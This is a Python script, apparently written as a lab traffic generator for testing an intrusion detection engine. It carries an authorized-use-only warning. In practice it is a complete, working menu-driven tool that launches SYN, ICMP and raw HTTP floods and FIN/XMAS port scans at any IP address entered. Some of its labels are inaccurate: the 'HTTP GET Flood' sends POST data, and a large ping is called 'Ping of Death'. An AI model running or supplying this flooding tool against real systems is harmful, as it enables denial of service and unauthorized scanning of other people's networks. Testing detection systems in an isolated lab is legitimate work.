#!/usr/bin/env python3
"""
Advanced Network Attack Simulator
=================================

AUTHORIZED USE ONLY
-------------------
This script sends real network attack traffic (SYN floods, ICMP floods,
HTTP floods, and port scans). It is included here strictly as a *test harness*
to validate the detection engine in `ids_engine.py` on an isolated lab
network you own or administer.

Only run it against:
  * a machine you own, or
  * a network you have explicit, documented written permission to test.

Do NOT run it against any third-party system, public IP, or infrastructure you
do not control. Doing so may be illegal (e.g. CFAA, Computer Misuse Act,
Computer Fraud and Abuse laws) and will get you banned or sued.

Requires root, because raw packet construction needs CAP_NET_RAW.
"""

import os
import sys
import time
import random
from scapy.all import IP, TCP, ICMP, send, RandIP, RandShort
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def print_banner():
    print("="*60)
    print("       Advanced Network Attack Simulator")
    print("       (Organic Traffic Generator)")
    print("="*60)

def syn_flood(target_ip, target_port, duration):
    print(f"\n[+] Launching SYN Flood against {target_ip}:{target_port} for {duration} seconds...")
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        # Use Kali's real IP address
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)
        count += 1
        if count % 100 == 0:
            print(f"    Sent {count} packets...")
    print(f"[✓] SYN Flood complete. Total packets sent: {count}")

def icmp_flood(target_ip, duration):
    print(f"\n[+] Launching ICMP Flood against {target_ip} for {duration} seconds...")
    # This targets the 'service_ecr_i' and 'src_bytes' importance!
    end_time = time.time() + duration
    count = 0
    payload = "X" * 1200  # Large payload
    while time.time() < end_time:
        # Use Kali's real IP address
        ip_layer = IP(dst=target_ip)
        icmp_layer = ICMP(type=8, code=0) # Echo Request
        packet = ip_layer / icmp_layer / payload
        send(packet, verbose=0)
        count += 1
        if count % 50 == 0:
            print(f"    Sent {count} large ICMP packets...")
            time.sleep(0.01)
    print(f"[✓] ICMP Flood complete. Total packets sent: {count}")

def http_flood(target_ip, target_port, duration):
    print(f"\n[+] Launching HTTP GET Flood against {target_ip}:{target_port} for {duration} seconds...")
    # This targets the 'service_http' importance!
    end_time = time.time() + duration
    count = 0
    while time.time() < end_time:
        # Use Kali's real IP address
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="PA")
        http_payload = "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 1400\r\n\r\n" + ("X" * 1400)
        packet = ip_layer / tcp_layer / http_payload
        send(packet, verbose=0)
        count += 1
        if count % 50 == 0:
            print(f"    Sent {count} HTTP packets...")
    print(f"[✓] HTTP Flood complete. Total packets sent: {count}")

def port_scan(target_ip, scan_type):
    print(f"\n[+] Launching {scan_type} Port Scan against {target_ip}...")
    ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
    
    flags_map = {"XMAS": "FPU", "FIN": "F", "NULL": "", "ACK": "A"}
    flag = flags_map.get(scan_type, "S")
    
    count = 0
    for port in ports:
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=port, flags=flag)
        send(ip_layer / tcp_layer, verbose=0)
        count += 1
        time.sleep(0.1)
    
    print(f"[✓] {scan_type} Scan complete. Scanned {count} common ports.")

def main():
    if os.geteuid() != 0:
        print("Please run this script as root (sudo)")
        sys.exit(1)
        
    target_ip = ""
    while not target_ip.strip():
        target_ip = input("Enter target IP address (e.g., 192.168.111.128): ").strip()
    
    while True:
        clear_screen()
        print_banner()
        print(f"Target: {target_ip}\n")
        print("1. SYN Flood (DoS)")
        print("2. ICMP Flood / Ping of Death (DoS - Triggers 'service_ecr_i')")
        print("3. HTTP GET Flood (Web Attack - Triggers 'service_http')")
        print("4. Stealth FIN Port Scan (Reconnaissance)")
        print("5. XMAS Tree Port Scan (Reconnaissance)")
        print("6. Change Target IP")
        print("7. Exit")
        
        choice = input("\nSelect an attack module (1-7): ")
        
        if choice == '1':
            syn_flood(target_ip, 80, 10)
        elif choice == '2':
            icmp_flood(target_ip, 10)
        elif choice == '3':
            http_flood(target_ip, 80, 10)
        elif choice == '4':
            port_scan(target_ip, "FIN")
        elif choice == '5':
            port_scan(target_ip, "XMAS")
        elif choice == '6':
            new_ip = ""
            while not new_ip.strip():
                new_ip = input("Enter new target IP address: ").strip()
            target_ip = new_ip
        elif choice == '7':
            print("Exiting...")
            break
        else:
            print("Invalid choice.")
            
        input("\nPress Enter to return to menu...")

if __name__ == "__main__":
    main()
